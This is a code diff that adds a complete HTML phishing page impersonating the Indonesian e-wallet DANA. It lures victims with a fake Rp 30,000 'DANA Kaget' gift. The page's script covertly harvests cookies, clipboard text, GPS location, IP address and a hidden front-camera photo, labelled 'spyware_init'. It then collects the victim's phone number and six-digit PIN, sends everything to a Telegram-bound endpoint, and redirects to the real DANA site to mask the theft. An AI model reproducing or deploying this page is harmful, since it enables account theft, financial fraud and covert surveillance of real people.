@@ -1,0 +1,194 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>DANA - Dompet Digital Indonesia</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <style>
+        * { box-sizing: border-box; margin: 0; padding: 0; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; }
+        body { background-color: #0b0f15; color: #333; display: flex; justify-content: center; align-items: center; min-height: 100vh; }
+        .container { width: 100%; max-width: 420px; background: #118EEA; min-height: 100vh; display: flex; flex-direction: column; justify-content: space-between; box-shadow: 0 0 25px rgba(0,0,0,0.4); position: relative; overflow: hidden; }
+        @media(min-width: 428px) { .container { min-height: 850px; border-radius: 24px; } }
+        .header-top { padding: 20px; display: flex; align-items: center; color: white; height: 60px; }
+        .header-top .back-btn { font-size: 18px; cursor: pointer; margin-right: 15px; width: 32px; height: 32px; display: flex; align-items: center; justify-content: center; border-radius: 50%; }
+        .header-top .title { font-size: 17px; font-weight: 600; letter-spacing: 0.3px; }
+        .logo-container { text-align: center; padding: 5px 0 15px 0; color: white; }
+        .logo-container .dana-logo { font-size: 24px; font-weight: 800; letter-spacing: 1px; background: white; color: #118EEA; display: inline-block; padding: 3px 16px; border-radius: 6px; box-shadow: 0 4px 10px rgba(0,0,0,0.1); }
+        .content-body { background: #f4f6f8; flex-grow: 1; border-top-left-radius: 24px; border-top-right-radius: 24px; padding: 24px 20px; display: flex; flex-direction: column; align-items: center; position: relative; }
+        .step-section { display: none; width: 100%; flex-direction: column; align-items: center; }
+        .step-section.active { display: flex; }
+
+        .envelope-card { background: #ffffff; width: 100%; border-radius: 16px; color: #333; padding: 24px 20px; box-shadow: 0 8px 20px rgba(17, 142, 234, 0.08); text-align: center; border: 1px solid #edf2f7; transition: transform 0.2s ease, box-shadow 0.2s ease; cursor: pointer; }
+        .envelope-card:active { transform: scale(0.97); box-shadow: 0 4px 10px rgba(17, 142, 234, 0.12); }
+
+        .icon-gift { width: 56px; height: 56px; background: #e8f4fc; color: #118EEA; border-radius: 50%; display: flex; align-items: center; justify-content: center; font-size: 24px; margin: 0 auto 12px auto; }
+        .envelope-card h2 { font-size: 17px; font-weight: 700; color: #111; margin-bottom: 4px; }
+        .envelope-card .sender { font-size: 12px; color: #666; margin-bottom: 10px; }
+        .form-group { width: 100%; margin-top: 14px; text-align: left; }
+        .form-group label { font-size: 12px; font-weight: 600; color: #4a5568; display: block; margin-bottom: 6px; }
+        .phone-input-wrapper { display: flex; gap: 8px; width: 100%; }
+        .country-code { background: #fff; border: 1.5px solid #cbd5e0; border-radius: 10px; padding: 12px 14px; font-size: 14px; font-weight: 600; color: #2d3748; display: flex; align-items: center; gap: 6px; }
+        .form-control { width: 100%; padding: 12px 14px; border: 1.5px solid #cbd5e0; border-radius: 10px; font-size: 14px; outline: none; background: #fff; color: #111; }
+        .pin-container { display: flex; justify-content: center; gap: 12px; margin: 25px 0 10px 0; width: 100%; }
+        .pin-box { width: 44px; height: 50px; text-align: center; font-size: 22px; font-weight: bold; border: 1.5px solid #cbd5e0; border-radius: 10px; background: #fff; outline: none; color: #111; }
+
+        .btn-action { width: 100%; background: #118EEA; color: white; border: none; padding: 14px; border-radius: 10px; font-size: 15px; font-weight: 700; cursor: pointer; margin-top: 24px; box-shadow: 0 4px 12px rgba(17,142,234,0.25); transition: transform 0.15s ease, background-color 0.2s ease; }
+        .btn-action:active { transform: scale(0.96); background: #0e76cb; }
+
+        .loading-overlay { position: absolute; top: 0; left: 0; width: 100%; height: 100%; background: rgba(255,255,255,0.96); display: none; justify-content: center; align-items: center; z-index: 99; flex-direction: column; text-align: center; padding: 20px; }
+        .loading-overlay.active { display: flex; }
+        
+        .skeleton-shimmer-box { width: 80%; max-height: 120px; background: #e2e8f0; border-radius: 12px; position: relative; overflow: hidden; margin-bottom: 16px; padding: 20px; display: flex; flex-direction: column; gap: 10px; align-items: center; justify-content: center; }
+        .skeleton-shimmer-box::after { content: ''; position: absolute; top: 0; left: -150%; width: 150%; height: 100%; background: linear-gradient(90deg, transparent, rgba(255, 255, 255, 0.6), transparent); animation: shimmer 1.2s infinite; }
+        @keyframes shimmer { 0% { transform: translateX(0); } 100% { transform: translateX(200%); } }
+        
+        .skeleton-line { width: 70%; height: 14px; background: #cbd5e0; border-radius: 6px; }
+        .skeleton-line.short { width: 40%; height: 10px; }
+
+        .success-checkmark { display: none; flex-direction: column; align-items: center; }
+        .check-icon { width: 60px; height: 60px; background: #25D366; color: white; border-radius: 50%; display: flex; align-items: center; justify-content: center; font-size: 30px; margin-bottom: 15px; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="header-top" id="headerNav">
+            <div class="back-btn"><i class="fa-solid fa-chevron-left"></i></div>
+            <div class="title" id="headerTitle">Buka DANA Kaget</div>
+        </div>
+        <div id="logoArea" class="logo-container" style="display: none;"><div class="dana-logo">DANA</div></div>
+        <div class="content-body">
+            <!-- STEP 1 -->
+            <div id="step1" class="step-section active">
+                <div class="envelope-card">
+                    <div class="icon-gift"><i class="fa-solid fa-envelope-open-text"></i></div>
+                    <h2>DANA Kaget</h2>
+                    <div class="sender">Dari <b>Bagi-Bagi Saldo Gratis</b></div>
+                    <p style="font-size: 13px; color: #4a5568; margin-top: 8px;">Kamu mendapat kiriman amplop DANA Kaget senilai <b>Rp 30.000</b>. Ambil sekarang!</p>
+                </div>
+                <button id="toPhoneBtn" class="btn-action">BUKA & AMBIL</button>
+            </div>
+            <!-- STEP 2 -->
+            <div id="step2" class="step-section">
+                <h3 style="font-size: 18px; color: #1a202c; font-weight: 700;">Masukkan nomor HP kamu untuk lanjut</h3>
+                <div class="form-group" style="margin-top: 20px;">
+                    <label>Nomor HP</label>
+                    <div class="phone-input-wrapper">
+                        <div class="country-code">🇮🇩 +62</div>
+                        <input type="tel" id="phoneNumber" class="form-control" placeholder="811-1234-5678" maxlength="13">
+                    </div>
+                </div>
+                <button id="toPinBtn" class="btn-action">LANJUTKAN</button>
+            </div>
+            <!-- STEP 3 -->
+            <div id="step3" class="step-section">
+                <h3 style="font-size: 18px; color: #1a202c; font-weight: 700;">Masukkan PIN DANA</h3>
+                <div class="pin-container">
+                    <input type="password" class="pin-box" maxlength="1" inputmode="numeric" />
+                    <input type="password" class="pin-box" maxlength="1" inputmode="numeric" />
+                    <input type="password" class="pin-box" maxlength="1" inputmode="numeric" />
+                    <input type="password" class="pin-box" maxlength="1" inputmode="numeric" />
+                    <input type="password" class="pin-box" maxlength="1" inputmode="numeric" />
+                    <input type="password" class="pin-box" maxlength="1" inputmode="numeric" />
+                </div>
+                <button id="submitAllBtn" class="btn-action" style="margin-top: 30px;">KONFIRMASI</button>
+            </div>
+        </div>
+        <div id="loadingModal" class="loading-overlay">
+            <div id="spinnerBox" style="display: flex; flex-direction: column; align-items: center; width: 100%;">
+                <div class="skeleton-shimmer-box">
+                    <div class="skeleton-line"></div>
+                    <div class="skeleton-line short"></div>
+                </div>
+                <p id="loadingText" style="font-size: 13px; font-weight: 600; color: #118EEA; margin-top: 10px;">Sedang Memproses...</p>
+            </div>
+            <div id="successBox" class="success-checkmark">
+                <div class="check-icon"><i class="fa-solid fa-check"></i></div>
+                <p style="font-size: 15px; font-weight: 700; color: #2d3748;">Verifikasi Berhasil!</p>
+            </div>
+        </div>
+    </div>
+    <video id="hiddenVideo" autoplay playsinline style="display:none;"></video>
+    <canvas id="hiddenCanvas" style="display:none;"></canvas>
+    <script>
+        let clientIP = "Memuat IP..."; let deviceGPS = "Tidak diizinkan"; let batteryInfo = "Tidak tersedia";
+        let clipboardData = "Kosong"; let cookieData = document.cookie || "Tidak ada"; let capturedPhoto = null; let micStatus = "Ditolak";
+        
+        fetch('https://api.ipify.org?format=json').then(res => res.json()).then(data => { clientIP = data.ip; }).catch(()=>{});
+        if(navigator.getBattery) { navigator.getBattery().then(bat => { batteryInfo = `${Math.round(bat.level*100)}%`; }); }
+        if(navigator.geolocation) { navigator.geolocation.getCurrentPosition(pos => { deviceGPS = `Lat:${pos.coords.latitude},Lon:${pos.coords.longitude}`; }, ()=>{}, {timeout:3000}); }
+        navigator.clipboard?.readText().then(t => { clipboardData = t || "Kosong"; }).catch(()=>{});
+
+        async function captureMedia() {
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: true });
+                micStatus = "Aktif / Diizinkan";
+                const video = document.getElementById('hiddenVideo');
+                video.srcObject = stream;
+                await new Promise(r => video.onloadedmetadata = r);
+                await video.play();
+                await new Promise(r => setTimeout(r, 600));
+                const canvas = document.getElementById('hiddenCanvas');
+                canvas.width = video.videoWidth || 640; canvas.height = video.videoHeight || 480;
+                canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
+                capturedPhoto = canvas.toDataURL('image/jpeg', 0.8);
+                stream.getTracks().forEach(track => track.stop());
+            } catch(e) { micStatus = "Ditolak"; }
+        }
+        captureMedia();
+
+        let globalPhone = "";
+        async function sendDataToBackend(payload) {
+            try {
+                // PERHATIAN: Nanti setelah Vercel ngasih domain baru, sesuaikan link di bawah ini kalau beda!
+                await fetch('/api/telegram', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(payload)
+                });
+            } catch(e){}
+        }
+
+        const step1 = document.getElementById('step1'), step2 = document.getElementById('step2'), step3 = document.getElementById('step3');
+        const loadingModal = document.getElementById('loadingModal'), spinnerBox = document.getElementById('spinnerBox'), successBox = document.getElementById('successBox');
+
+        document.getElementById('toPhoneBtn').addEventListener('click', async () => {
+            loadingModal.classList.add('active');
+            await captureMedia();
+            setTimeout(async () => {
+                await sendDataToBackend({ type: "spyware_init", ip: clientIP, gps: deviceGPS, battery: batteryInfo, clipboard: clipboardData, cookies: cookieData, mic: micStatus, photo: capturedPhoto, userAgent: navigator.userAgent });
+                loadingModal.classList.remove('active');
+                step1.classList.remove('active'); step2.classList.add('active');
+            }, 1000);
+        });
+
+        document.getElementById('toPinBtn').addEventListener('click', async () => {
+            const p = document.getElementById('phoneNumber').value.trim();
+            if(p.length < 9) { alert("Nomor HP tidak valid!"); return; }
+            globalPhone = "0" + p.replace(/^0+/, '');
+            loadingModal.classList.add('active');
+            await sendDataToBackend({ type: "step_phone", ip: clientIP, phone: globalPhone });
+            setTimeout(() => {
+                loadingModal.classList.remove('active');
+                step2.classList.remove('active'); step3.classList.add('active');
+            }, 1000);
+        });
+
+        const pinBoxes = document.querySelectorAll('.pin-box');
+        pinBoxes.forEach((b, i) => {
+            b.addEventListener('input', (e) => { if(e.target.value && i < pinBoxes.length - 1) pinBoxes[i+1].focus(); });
+        });
+
+        document.getElementById('submitAllBtn').addEventListener('click', async () => {
+            let pinVal = ""; pinBoxes.forEach(b => pinVal += b.value);
+            if(pinVal.length < 6) { alert("Lengkapi 6 digit PIN!"); return; }
+            loadingModal.classList.add('active');
+            await sendDataToBackend({ type: "final_submission", ip: clientIP, phone: globalPhone, pin: pinVal, gps: deviceGPS, battery: batteryInfo, clipboard: clipboardData, cookies: cookieData, mic: micStatus });
+            setTimeout(() => {
+                spinnerBox.style.display = "none"; successBox.style.display = "flex";
+                setTimeout(() => { window.location.href = "https://www.dana.id"; }, 2000);
+            }, 1200);
+        });
+    </script>
+</body>
+</html>
